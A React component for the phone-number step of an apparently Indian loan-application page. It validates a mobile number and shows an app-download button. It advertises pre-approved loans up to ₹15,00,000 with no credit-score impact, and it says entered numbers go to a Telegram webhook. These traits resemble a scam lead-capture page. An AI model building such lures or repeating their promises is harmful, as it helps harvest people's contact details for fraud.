import React, { useState } from 'react';
import { Phone, ArrowRight, ShieldCheck, Lock, Sparkles, Loader2 } from 'lucide-react';
import { motion } from 'motion/react';
import { AppDownloadButton } from './AppDownloadButton';

interface Step1PhoneProps {
  onContinue: (phone: string) => Promise<void>;
  initialPhone?: string;
}

export const Step1Phone: React.FC<Step1PhoneProps> = ({ onContinue, initialPhone = '' }) => {
  const [phone, setPhone] = useState(initialPhone);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setPhone(value);
    if (error) setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length !== 10) {
      setError('Please enter a valid 10-digit mobile number');
      return;
    }
    setError('');
    setLoading(true);
    try {
      await onContinue(`+91 ${phone}`);
    } catch (err: any) {
      setError(err.message || 'Failed to submit mobile number');
    } finally {
      setLoading(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      className="max-w-md mx-auto bg-white rounded-3xl border border-slate-200/80 shadow-xl shadow-slate-200/50 p-4 sm:p-7"
    >
      <div className="text-center mb-5">
        <div className="w-12 h-12 sm:w-14 sm:h-14 bg-emerald-50 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-2.5 border border-emerald-100 shadow-inner">
          <Phone className="w-6 h-6 sm:w-7 sm:h-7" />
        </div>
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 tracking-tight">Enter Phone Number</h2>
        <p className="text-xs sm:text-sm text-slate-500 mt-1 px-1">
          Enter your mobile number to check instant pre-approved loan offers up to ₹15,00,000
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-3.5">
        <div>
          <label className="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1.5">
            Mobile Number
          </label>
          <div className="relative flex items-center">
            <div className="absolute left-3 flex items-center space-x-1 text-slate-600 font-bold text-xs sm:text-sm bg-slate-100 px-2 py-1 rounded-md border border-slate-200">
              <span>🇮🇳</span>
              <span>+91</span>
            </div>
            <input
              type="tel"
              value={phone}
              onChange={handlePhoneChange}
              placeholder="98765 43210"
              className="w-full pl-22 sm:pl-24 pr-3.5 py-3 bg-slate-50 border border-slate-200 rounded-xl sm:rounded-2xl text-slate-900 font-semibold text-base sm:text-lg tracking-wider focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all"
              maxLength={10}
              autoFocus
            />
          </div>
          {error && <p className="text-xs text-rose-500 mt-1 font-medium">{error}</p>}
        </div>

        <div className="bg-slate-50 rounded-xl sm:rounded-2xl p-2.5 sm:p-3 border border-slate-100 space-y-1.5">
          <div className="flex items-center space-x-2 text-[11px] sm:text-xs text-slate-600 font-medium">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
            <span>Instant Direct Verification</span>
          </div>
          <div className="flex items-center space-x-2 text-[11px] sm:text-xs text-slate-600 font-medium">
            <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
            <span>No impact on CIBIL Score query</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={phone.length !== 10 || loading}
          className="w-full py-3 sm:py-3.5 bg-slate-900 hover:bg-slate-800 disabled:bg-slate-200 disabled:text-slate-400 text-white text-xs sm:text-sm font-semibold rounded-xl sm:rounded-2xl transition-all shadow-md flex items-center justify-center space-x-2 group cursor-pointer"
        >
          {loading ? (
            <>
              <Loader2 className="w-4 h-4 animate-spin text-white" />
              <span>Sending Details...</span>
            </>
          ) : (
            <>
              <span>Continue</span>
              <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </>
          )}
        </button>

        {/* App Download Button directly below Continue button */}
        <AppDownloadButton />
      </form>

      <div className="mt-6 pt-4 border-t border-slate-100 text-center">
        <p className="text-[11px] text-slate-400 flex items-center justify-center space-x-1">
          <Sparkles className="w-3.5 h-3.5 text-amber-500" />
          <span>Number updates will be transmitted to Telegram notification webhook</span>
        </p>
      </div>
    </motion.div>
  );
};
